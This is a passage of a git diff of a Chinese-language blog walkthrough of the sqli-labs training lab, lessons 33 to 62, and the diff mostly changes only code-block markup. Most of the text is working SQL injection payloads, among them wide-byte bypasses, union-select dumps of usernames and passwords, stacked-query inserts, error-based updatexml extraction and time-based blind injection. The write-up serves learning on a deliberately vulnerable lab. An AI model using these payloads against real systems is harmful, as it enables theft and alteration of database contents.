-?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">ee</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schcema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span> <span class="token comment" spellcheck="true">--+//对user进行十六进制编码，此时的‘’可以用0x代替</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>ee<span class="token string">' union select 1,2,column_name from information_schcema.columns where table_name='</span>users<span class="token string">' --+//不行
+?id=-1%ee'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schcema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span> <span class="token comment">--+//对user进行十六进制编码，此时的‘’可以用0x代替</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115107796-a44c1c80-9f9f-11eb-9a20-f40227e9bca2.png" alt="image"></p>
 <p>剩下就没啥了。。。过</p>
 <h2 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33.宽字节注入"></a>33.宽字节注入</h2><p>仍然是刚才查列的句子，直接爆出来了。。</p>
@@ -1254,29 +1172,24 @@ __完了，没有回显了，那么我们就想到报错注入__
 <h2 id="34-POST型宽字节注入"><a href="#34-POST型宽字节注入" class="headerlink" title="34. POST型宽字节注入"></a>34. POST型宽字节注入</h2><p>这样的做法，已经比较熟悉了，看见表单抓包构建payload。。</p>
 <ul>
 <li><p>查看有没有回显，显没有进行查看闭合方式，因为如果闭合方式不对的话，是会报错的</p>
-<pre><code>admin%ee&#39; union select 1,2 #
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">admin%ee&#39; union select 1,2 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115108242-e8402100-9fa1-11eb-98c1-56da982232db.png" alt="image"></p>
 </li>
 <li><p>查库</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">ee</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span>ee' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115108290-32c19d80-9fa2-11eb-8bc1-0593bf408eaf.png" alt="image"></p>
 </li>
 <li><p>查表</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">ee</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span>ee' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115108348-92b84400-9fa2-11eb-9da0-c54c555a1149.png" alt="image"></p>
 </li>
 <li><p>查字段</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">ee</span><span class="token string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span>ee<span class="token string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115108418-f2165400-9fa2-11eb-8443-ed7484f40e79.png" alt="image"></p>
 </li>
 </ul>
 <p>直接报错，根据错误也知道发生了啥</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span><span class="token number">ee</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span> <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token operator">%</span>ee' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span> <span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115108450-1bcf7b00-9fa3-11eb-8cb8-9f80bf568404.png" alt="image"></p>
 <p>这样就和谐了。。。</p>
 <p>过了，不说了。。。</p>
@@ -1321,24 +1234,21 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p>还是很容易就可以查到的</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115109447-5982d280-9fa8-11eb-9f6a-b520f94179ea.png" alt="image"></p>
 <p>最后可以让用户名和密码一起查询</p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.220.12/sqli/Less-38/?id=-1'%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//192.168.220.12/sqli/Less-38/?id=-1'%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115109613-6fdd5e00-9fa9-11eb-8f9c-5ae13832cc86.png" alt="image"></p>
 <h2 id="39-STACK-Query"><a href="#39-STACK-Query" class="headerlink" title="39. STACK Query"></a>39. STACK Query</h2><ul>
 <li>查看闭合方式</li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115109519-c007f080-9fa8-11eb-8de3-58c68c6fb80f.png" alt="image"></p>
 <ul>
-<li>很显然是数字型注入，没有闭合方式<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.220.12/sqli/Less-39/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20 --+//用户名和密码一起爆</span>
-</code></pre>
+<li>很显然是数字型注入，没有闭合方式<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//192.168.220.12/sqli/Less-39/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20 --+//用户名和密码一起爆</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 直接显示所有数据</li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115109585-40c6ec80-9fa9-11eb-8570-828bdb63e395.png" alt="image"></p>
 <h2 id="40-堆叠"><a href="#40-堆叠" class="headerlink" title="40.堆叠"></a>40.堆叠</h2><p><img src="https://user-images.githubusercontent.com/76896357/115110591-cc8f4780-9fae-11eb-9a97-55ea3314f164.png" alt="image"></p>
 <p>闭合方式是‘),注入方式同上</p>
 <h2 id="41-STACK-QUERy-盲注"><a href="#41-STACK-QUERy-盲注" class="headerlink" title="41. STACK QUERy 盲注"></a>41. STACK QUERy 盲注</h2><p>但还是有回显</p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.220.12/sqli/Less-40/?id=-1%27)%20union%20select%201,2,3%20--+//猜闭合方式就可以了</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//192.168.220.12/sqli/Less-40/?id=-1%27)%20union%20select%201,2,3%20--+//猜闭合方式就可以了</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <ul>
 <li>猜测闭合方式</li>
 </ul>
@@ -1388,15 +1298,14 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p>走偏了，，这个就是最直接加个分号后面再构造一条sql语句</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115116532-8d6fef00-9fcc-11eb-9d91-1247d1dd19b4.png" alt="image"></p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115116576-c4de9b80-9fcc-11eb-8286-45e418b5420d.png" alt="image"></p>
-<h2 id="44-同理过了，，，"><a href="#44-同理过了，，，" class="headerlink" title="44. 同理过了，，，"></a>44. 同理过了，，，</h2><h2 id="45-同理"><a href="#45-同理" class="headerlink" title="45. 同理"></a>45. 同理</h2><pre><code>1&#39;);insert into users(id,username,password) values(45,&#39;Less45&#39;,&#39;Less45&#39;)#
-</code></pre>
+<h2 id="44-同理过了，，，"><a href="#44-同理过了，，，" class="headerlink" title="44. 同理过了，，，"></a>44. 同理过了，，，</h2><h2 id="45-同理"><a href="#45-同理" class="headerlink" title="45. 同理"></a>45. 同理</h2><pre class="line-numbers language-none"><code class="language-none">1&#39;);insert into users(id,username,password) values(45,&#39;Less45&#39;,&#39;Less45&#39;)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115117052-4e8f6880-9fcf-11eb-843d-24364567e9de.png" alt="image"></p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115117061-5c44ee00-9fcf-11eb-80f5-7c5c2567091a.png" alt="image"></p>
 <h2 id="46-数字型order-by注入"><a href="#46-数字型order-by注入" class="headerlink" title="46. 数字型order by注入"></a>46. 数字型order by注入</h2><p>检查是否存在order by注入</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115117576-e726e800-9fd1-11eb-9bc0-e0d49194de58.png" alt="image"></p>
-<pre><code>?sort = 1+asc
-?sort = 1+desc
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?sort &#x3D; 1+asc
+?sort &#x3D; 1+desc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>asc</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/115117612-1178a580-9fd2-11eb-82f8-01ba259ec77f.png" alt="image"></p>
 <p>desc</p>
@@ -1423,9 +1332,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/115129699-f8e0ad80-a01a-11eb-8696-f179b55f42fe.png" alt="image"></p>
 <p>同样不行</p>
 <ol start="4">
-<li>绝招，延时注入<pre class=" language-sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
-</code></pre>
-</li>
+<li>绝招，延时注入<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 <p><img src="https://user-images.githubusercontent.com/76896357/115129769-a9e74800-a01b-11eb-9059-a41c883dcfb6.png" alt="image"></p>
 <p>这就比较和谐了，之后利用bp爆破吧，和之前类似，设置两个参数，修改一个参数。。</p>
@@ -1455,8 +1362,8 @@ __完了，没有回显了，那么我们就想到报错注入__
 </ul>
 <p>好吧，还是不行</p>
 <p>*延时注入</p>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.220.12/sqli/Less-50/?sort=1%20and%20length(database())=8%20and%20if(1=1,sleep(1),1)//多个and，有一个不满组都不行</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//192.168.220.12/sqli/Less-50/?sort=1%20and%20length(database())=8%20and%20if(1=1,sleep(1),1)//多个and，有一个不满组都不行</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115130280-1add2e80-a021-11eb-8f21-619ff5dc9519.png" alt="image"></p>
 <p>好吧还是延时注入</p>
 <p>接下来，就延时爆破吧</p>
@@ -1470,8 +1377,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115130641-dc953e80-a023-11eb-8c56-942ca88e3cae.png" alt="image"></p>
 <ul>
-<li>直接延时注入吧<pre class=" language-sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length(database())=8 and if(1=1,sleep(2),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>
-</code></pre>
+<li>直接延时注入吧<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length(database())=8 and if(1=1,sleep(2),1) or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 同样的套路</li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115130838-832e0f00-a025-11eb-8a76-e98a59bd39d7.png" alt="image"></p>
@@ -1481,38 +1387,36 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/115131043-5844ba80-a027-11eb-92d5-f5518c2e5ef3.png" alt="image"></p>
 <p>有回显</p>
 <p>查库，</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
 <p>得到challenges库</p>
 <p>查表</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>20union<span class="token operator">%</span>20select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">%</span>20from<span class="token operator">%</span>20information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span>20where<span class="token operator">%</span>20table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span>union<span class="token operator">%</span><span class="token number">20</span>select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">20</span>where<span class="token operator">%</span><span class="token number">20</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115131540-76141e80-a02b-11eb-9625-50fe5c349feb.png" alt="image"></p>
 <p>查段</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>5gp3nwnqh6' <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span><span class="token number">5</span>gp3nwnqh6' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115131554-85936780-a02b-11eb-95ec-d30b78236931.png" alt="image"></p>
 <ul>
-<li>查字段内容<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>20union<span class="token operator">%</span>20select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>sessid<span class="token operator">%</span>20from<span class="token operator">%</span>20challenges<span class="token punctuation">.</span>5gp3nwnqh6<span class="token operator">%</span><span class="token number">20</span><span class="token comment" spellcheck="true">--+</span>
-</code></pre>
-</li>
+<li>查字段内容<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span>union<span class="token operator">%</span><span class="token number">20</span>select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>sessid<span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>challenges<span class="token punctuation">.</span><span class="token number">5</span>gp3nwnqh6<span class="token operator">%</span><span class="token number">20</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115131589-bd021400-a02b-11eb-9135-e6da3895ede0.png" alt="image"></p>
 <h2 id="55-基于小括号的挑战"><a href="#55-基于小括号的挑战" class="headerlink" title="55. 基于小括号的挑战"></a>55. 基于小括号的挑战</h2><p>那啥这道题试上几十次就可以了，发现是)闭合</p>
 <ul>
 <li>查字段内容</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span>20union<span class="token operator">%</span>20select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>sessid<span class="token operator">%</span>20from<span class="token operator">%</span>20challenges<span class="token punctuation">.</span>5gp3nwnqh6<span class="token operator">%</span><span class="token number">20</span><span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>union<span class="token operator">%</span><span class="token number">20</span>select<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>sessid<span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>challenges<span class="token punctuation">.</span><span class="token number">5</span>gp3nwnqh6<span class="token operator">%</span><span class="token number">20</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115131608-e622a480-a02b-11eb-8881-a019b0757c50.png" alt="image"></p>
 <p>然后就随便了。。。</p>
 <h2 id="56-‘-挑战"><a href="#56-‘-挑战" class="headerlink" title="56. ‘)挑战"></a>56. ‘)挑战</h2><ul>
-<li>寻找闭合方式看看有没有回显<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<li>寻找闭合方式看看有没有回显<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/115131735-f8e9a900-a02c-11eb-8e77-c5ee46eb2bb0.png" alt="image"></li>
 </ul>
-<pre><code>?id=0&#39;) union select 1,2,3 --+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;0&#39;) union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115131770-29314780-a02d-11eb-8400-4af1d307644a.png" alt="image"></p>
 <p>过了。。。</p>
 <h2 id="57-基于“”的挑战"><a href="#57-基于“”的挑战" class="headerlink" title="57. 基于“”的挑战"></a>57. 基于“”的挑战</h2><ul>
@@ -1532,8 +1436,8 @@ __完了，没有回显了，那么我们就想到报错注入__
 <h2 id="58-不能用union-select"><a href="#58-不能用union-select" class="headerlink" title="58. 不能用union select"></a>58. 不能用union select</h2><ul>
 <li>猜测闭合方式</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.220.12/sqli/Less-58/index.php?id=1%27%20%20--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//192.168.220.12/sqli/Less-58/index.php?id=1%27%20%20--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115132074-862dfd00-a02f-11eb-9b84-79e4eda7380d.png" alt="image"></p>
 <p>‘’的闭合方式</p>
 <ul>
@@ -1544,8 +1448,8 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>查看会不会报错</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//192.168.220.12/sqli/Less-58/index.php?id=0%27%20and%20updatexml(1,concat(%27~%27,(select%20database()),%27~%27),1)%20--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//192.168.220.12/sqli/Less-58/index.php?id=0%27%20and%20updatexml(1,concat(%27~%27,(select%20database()),%27~%27),1)%20--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115132067-77dfe100-a02f-11eb-96d2-fb62f7981462.png" alt="image"></p>
 <p>利用报错逐个查询吧</p>
 <h2 id="59-数字型报错挑战"><a href="#59-数字型报错挑战" class="headerlink" title="59. 数字型报错挑战"></a>59. 数字型报错挑战</h2><ul>
@@ -1579,14 +1483,12 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>报列</li>
 </ul>
-<pre><code>http://192.168.220.12/sqli/Less-61/?id=1%27))%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27vhe0p7yp4g%27),%27~%27),1)%20--+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.220.12&#x2F;sqli&#x2F;Less-61&#x2F;?id&#x3D;1%27))%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27vhe0p7yp4g%27),%27~%27),1)%20--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115132348-f6d61900-a031-11eb-9efa-50215c6bee2f.png" alt="image"></p>
 <ul>
 <li>报字段</li>
 </ul>
-<pre><code>http://192.168.220.12/sqli/Less-61/?id=1%27))%20and%20updatexml(1,concat(%27~%27,(select%20sessid%20from%20challenges.vhe0p7yp4g),%27~%27),1)%20--+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.220.12&#x2F;sqli&#x2F;Less-61&#x2F;?id&#x3D;1%27))%20and%20updatexml(1,concat(%27~%27,(select%20sessid%20from%20challenges.vhe0p7yp4g),%27~%27),1)%20--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115132399-62b88180-a032-11eb-9246-0c50d2624470.png" alt="image"></p>
 <p>改一下，表名就好了。。</p>
 <h2 id="62-union-select-和-报错都不行的挑战"><a href="#62-union-select-和-报错都不行的挑战" class="headerlink" title="62. union select 和 报错都不行的挑战"></a>62. union select 和 报错都不行的挑战</h2><ul>
@@ -1610,30 +1512,25 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/115132509-8fb96400-a033-11eb-964e-6fa41f9cffc4.png" alt="image"></p>
 <p>*没办法，，让他睡觉吧</p>
 <ul>
-<li>延时注入<pre><code>http://192.168.220.12/sqli/Less-62/?id=1%27)%20and%20length(database())%3E5%20and%20if(1=1,sleep(2),1)%20--+
-</code></pre>
-</li>
+<li>延时注入<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.220.12&#x2F;sqli&#x2F;Less-62&#x2F;?id&#x3D;1%27)%20and%20length(database())%3E5%20and%20if(1&#x3D;1,sleep(2),1)%20--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115132538-c7c0a700-a033-11eb-9798-d2bf7616c211.png" alt="image"></p>
 <p>那么就开是愉快的爆破吧</p>
 <ul>
-<li>查库<pre><code>http://192.168.220.12/sqli/Less-62/?id=1%27)%20and%20substr(database(),1,1)=%27c%27%20and%20if(1=1,sleep(2),1)%20--+//就挑时间长的
-</code></pre>
-</li>
+<li>查库<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.220.12&#x2F;sqli&#x2F;Less-62&#x2F;?id&#x3D;1%27)%20and%20substr(database(),1,1)&#x3D;%27c%27%20and%20if(1&#x3D;1,sleep(2),1)%20--+&#x2F;&#x2F;就挑时间长的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/115132893-b6c56500-a036-11eb-9f32-31ef57e00709.png" alt="image"></p>
 <ul>
 <li>查表</li>
 </ul>
-<pre><code>192.168.220.12/sqli/Less-62/?id=1&#39;) and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#39;c&#39; and if(1=1,sleep(2),1) --+
-</code></pre>
